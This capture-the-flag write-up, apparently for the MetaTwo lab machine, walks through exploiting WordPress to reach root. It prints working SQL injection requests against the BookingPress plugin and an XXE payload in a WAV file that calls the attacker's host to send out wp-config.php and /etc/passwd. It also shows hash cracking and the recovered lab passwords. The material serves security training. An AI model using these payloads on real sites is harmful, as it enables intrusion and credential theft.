
![logo metatwo](Images/logo%20metatwo.png)

# Attack Chain

```
└─► WordPress 5.6.2 → plugin BookingPress → CVE-2022-0739 (SQLi unauth)
	└─► dump wp_users → crack manager → partylikearockstar
		└─► login WP as manager (Media upload)
			└─► CVE-2021-29447 (XXE) → php://filter → wp-config.php
				└─► creds FTP → mailer/send_email.php
					└─► SMTP pass = SSH pass → ssh jnelson → user.txt
						└─► ~/.passpie/.keys → gpg2john → john → blink182
							└─► passpie export → root SSH pass
								└─► su root → root.txt
```
# Summary

- [Enumeration](#enumeration)
- [Web](#web)
- [Wordpress Enumeration](#wordpress-enumeration)
- [CVE-2022-0739](#cve-2022-0739)
	- [Nonce number](#nonce-number)
	- [Confirmation](#confirmation)
	- [Database Name](#database-name)
	- [Dump wp_users](#dump-wp_users)
	- [Crack the hashes](#crack-the-hashes)
	- [Wordpress Panel connection](#wordpress-panel-connection)
- [CVE-2021-29447](#cve-2021-29447)
	- [Payload Crafting](#payload-crafting)
	- [POC](#poc)
	- [Extract wp-config.php](#extract-wp-configphp)
- [FTP](#ftp)
- [Shell as jnelson](#shell-as-jnelson)
- [Privilege Escalation](#privilege-escalation)
	- [Passpie](#passpie)
	- [Crack pgp private key](#crack-pgp-private-key)
	- [Export database](#export-database)
	- [Shell as root](#shell-as-root)

---
# Enumeration

```
nmap -sVC 10.129.*.* -oA nmap

Host is up (0.0076s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-trane-info: Problem with XML parsing of /evox/about
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0
|_http-generator: WordPress 5.6.2
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: MetaPress &#8211; Official company site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> [!NOTE]
> **Observations**
> - FTP is open but anonymous login isn't enabled
> - Port 80 is a wordpress website (from the` /robots.txt` in the scan)
> - Redirection to `metapress.htb`

Let's add the entry to our `/etc/hosts` file.

```
echo '10.129.*.* metapress.htb' | tee -a /etc/hosts
```

# Web

Let's inspect the **WordPress** site since it's pretty much the only thing we can do here.

![web metatwo](Images/web%20metatwo.png)

We have the confirmation that it's running **WordPress** from the footer.

![wordpress discovery](Images/wordpress%20discovery.png)

# Wordpress Enumeration

First thing we can do is using `wpscan` to enumerate things such as the version, plugins used, etc...

```
wpscan --no-banner --url "http://metapress.htb" --api-token "<token>" 

<SNIP>

[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
 | Found By: Rss Generator (Passive Detection)
 |  - http://metapress.htb/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
 |  - http://metapress.htb/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
 |
 | [!] 46 vulnerabilities identified:

<SNIP>
```

The version used is **5.6.2** and has a lot of vulnerabilities at the time of writing (July 2026).

Let's enumerate the users on the target.

```
wpscan --no-banner --url "http://metapress.htb" --api-token "azCGu6s6cgOczduxCNMZ587x2NcgQRiFJyvtCWbNg5U" -eu

<SNIP>

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://metapress.htb/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://metapress.htb/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] manager
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

<SNIP>
```

There are 2 users, `admin`, and `manager`.

However, we don't find any plugin on the target, but notice a `/events` page with a planning on it. 

Let's run the scan over this page.

```
wpscan --no-banner --url "http://metapress.htb/events" --api-token "azCGu6s6cgOczduxCNMZ587x2NcgQRiFJyvtCWbNg5U" -eap --wp-content-dir "http://metapress.htb/wp-content"

<SNIP>

[i] Plugin(s) Identified:

[+] bookingpress-appointment-booking
 | Location: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/
 | Last Updated: 2025-02-01T14:58:00.000Z
 | [!] The version is out of date, the latest version is 1.1.28
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 16 vulnerabilities identified:
 |
 | [!] Title: BookingPress < 1.0.11 - Unauthenticated SQL Injection
 |     Fixed in: 1.0.11
 |     References:
 |      - https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0739
 |      - https://plugins.trac.wordpress.org/changeset/2684789
 
 <SNIP>
```

We found the plugin `BookingPress` which likely appears to be vulnerable.

# CVE-2022-0739

The used version is vulnerable to **CVE-2022-0739**, an unauthenticated SQL injection. We can have more info from [here](https://www.cve.org/CVERecord?id=CVE-2022-0739).
A POC can be found [here](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357/).

### Nonce number

To exploit the CVE, we must retrieve the nonce number that should be displayed in the `/events` page.

![nonce number](Images/nonce%20number.png)

### Confirmation

After modifying the nonce number, we can send the default request from **wpscan** and look at its result.

```
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' -d 'action=bookingpress_front_get_category_services&_wpnonce=c89c4aa256&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Fri, 10 Jul 2026 09:41:32 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

The target is indeed vulnerable.

### Database Name

We could have used `sqlmap` to speed up the process with the following command.

```
sqlmap -u http://metapress.htb/wp-admin/admin-ajax.php --data 'action=bookingpress_front_get_category_services&_wpnonce=c89c4aa256&category_id=33&total_service=785)' -p total_service --level 5 --risk 3 --technique=BEUSQ
```

But i chose to do it manually.

We can dump the current database with the following command.

```
curl 'http://metapress.htb/wp-admin/admin-ajax.php' -d 'action=bookingpress_front_get_category_services&_wpnonce=c89c4aa256&category_id=33&total_service=-7502) UNION ALL SELECT 0,1,2,3,4,5,6,7,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata-- -' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   717    0   508  100   209  17041   7011 --:--:-- --:--:-- --:--:-- 24724
[
  {
    "bookingpress_service_id": "0",
    "bookingpress_category_id": "1",
    "bookingpress_service_name": "2",
    "bookingpress_service_price": "$3.00",
    "bookingpress_service_duration_val": "4",
    "bookingpress_service_duration_unit": "5",
    "bookingpress_service_description": "6",
    "bookingpress_service_position": "7",
    "bookingpress_servicedate_created": "|information_schema|,|blog|",
    "service_price_without_currency": 3,
    "img_url": "http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"
  }
]

```

There are 2 databases, `information_schema`, and the most interesting one `blog`.

### Dump wp_users

After a quick research on how data are stored via **Wordpress**, we can find this [article](https://usersinsights.com/wordpress-user-database-tables/) that details the structure.

With these information, we can dump users and their hash.

```
curl 'http://metapress.htb/wp-admin/admin-ajax.php' -d 'action=bookingpress_front_get_category_services&_wpnonce=c89c4aa256&category_id=33&total_service=-7502) UNION ALL SELECT GROUP_CONCAT(0x7c,user_login,0x7C),GROUP_CONCAT(0x7c,user_pass,0x7C),1,2,3,4,5,6,7 from blog.wp_users-- -' | jq

[
  {
    "bookingpress_service_id": "|admin|,|manager|",
    "bookingpress_category_id": "|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|,|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|",
    "bookingpress_service_name": "1",
    "bookingpress_service_price": "$2.00",
    "bookingpress_service_duration_val": "3",
    "bookingpress_service_duration_unit": "4",
    "bookingpress_service_description": "5",
    "bookingpress_service_position": "6",
    "bookingpress_servicedate_created": "7",
    "service_price_without_currency": 2,
    "img_url": "http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"
  }
]
```

> [!TIP]
> **Hashes dumped**
> - `admin` : `$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.`
> - `manager` :  `$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70`

### Crack the hashes

We can now put these hashes inside a file and attempt to crack them with `hashcat`.

```
hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt

<SNIP>

$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar     
```

We successfully crack the password for `manager` (`partylikearockstar`) but couldn't crack the password of `admin`.

### WordPress Panel connection

Let's check if we can connect on our panel.

![login as manager](Images/login%20as%20manager.png)

We don't have admin privileges, but we have the possibility to upload **Media** files.

# CVE-2021-29447

Since the version of **Wordpress** is 5.6.2. The target is vulnerable to [CVE-2021-29447](https://www.cve.org/CVERecord?id=CVE-2021-29447).

We can find a detailed POC [here](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/).

### Payload Crafting

In order to perform the attack, we must create several files.

First the file we will upload on the target.

**payload.wav**
```
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY % remote SYSTEM 
'"'"'http://10.10.*.*:8000/xxe.dtd'"'"'>%remote;%oob;%trick;]>\x00' > payload.wav
```

Then the file we will host on our machine, which will retrieve files on the target and encode them in base64.

**xxe.dtd**
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY &#x25; trick SYSTEM 'http://10.10.*.*:8000/?content=%file;'>">
```

And as a bonus, we can create a file that will automatically decode the base64 into plain text.

**index.php**
```
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

### POC

Now that we made our prerequisites, we can start our PHP listener and upload our payload to retrieve `/etc/passwd`.

```
php -S 0.0.0.0:8000

[Fri Jul 10 09:25:16 2026] PHP 8.4.16 Development Server (http://0.0.0.0:8000) started
[Fri Jul 10 09:25:20 2026] 10.129.*.*:40196 Accepted
[Fri Jul 10 09:25:20 2026] 10.129.*.*:40196 [200]: GET /xxe.dtd
[Fri Jul 10 09:25:20 2026] 10.129.*.*:40196 Closing
[Fri Jul 10 09:25:20 2026] 10.129.*.*:40212 Accepted
[Fri Jul 10 09:25:20 2026] 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```

It worked as expected.

### Extract wp-config.php

Now we modify our **xxe.dtd** file to dump the `wp-config.php` file.

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=../wp-config.php">
<!ENTITY % oob "<!ENTITY &#x25; trick SYSTEM 'http://10.10.*.*:8000/?content=%file;'>">
```

And then we redo the process and we will have the following.

```
<SNIP>

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

<SNIP>

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

<SNIP>
```

It appears that we now have credentials for the FTP server.

# FTP

Let's connect to the FTP server now.

```
ftp 10.129.*.*
Connected to metapress.htb.
220 ProFTPD Server (Debian) [::ffff:10.129.*.*]
Name (ftp.metapress.htb:root): metapress.htb
331 Password required for metapress.htb
Password: 
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||13907|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5  2022 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5  2022 mailer
ftp> cd mailer
ftp> ls
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5  2022 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php
ftp> get send_email.php

```

After inspecting the FTP server, we could see that there was the **Wordpress** files under `blog`.

But we found interesting data inside the file **send_email.php** :

```
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;      
```

We have the password of the user `jnelson` which is present on the target according to the `/etc/passwd` file.

# Shell as jnelson

Let's try our new credentials over ssh.

```
ssh jnelson@metapress.htb
jnelson@metapress.htb's password: Cb4_JmWM8zUZWMu@Ys

jnelson@meta2:~$
```

It worked ! We can get the user flag from here.
# Privilege Escalation

In our home directory, we notice that there is a hidden folder `.passpie`.
### Passpie

**Passpie** is a command line tool to manage passwords from the terminal with a colorful and configurable interface that uses a master passphrase to decrypt login credentials.

Inside the folder we notice the file `.key` which contains the public and private pgp key.

```
jnelson@meta2:~/.passpie$ ls -la
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25  2022 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25  2022 ssh
```

We can also check the version of the tool.

```
jnelson@meta2:~/.passpie/ssh$ passpie --version
passpie, version 1.6.1
```

But the version is not vulnerable.

We can also list every entries stored inside the password manager.

```
jnelson@meta2:~$ passpie list
╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛
```

There is an entry for the `root`'s password.

### Crack pgp private key

Since we can access the private pgp key, we can copy it to our machine and attempt to crack it.

After putting the key inside a file, we can use `gpg2john` to extract the hash.

```
gpg2john pgp_private.txt > hash_pgp.txt
```

Then we crack it with `john`.

```
john hash_pgp.txt --wordlist=/usr/share/wordlists/rockyou.txt    
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie) 
```

We retrieve the master password `blink182`.

### Export database

Now we can export the database of the password manager using the master password.

```
jnelson@meta2:~$ passpie export db
Passphrase: blink182
```

```
jnelson@meta2:~$ cat db 
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```

And here we can find the password for the `root` user.

### Shell as root

Let's connect as `root` on the target now.

```
jnelson@meta2:~$ su root
Password: p7qfAZt4_A1xo_0x

root@meta2:~#
```

> [!TIP]
> **Machine Rooted**

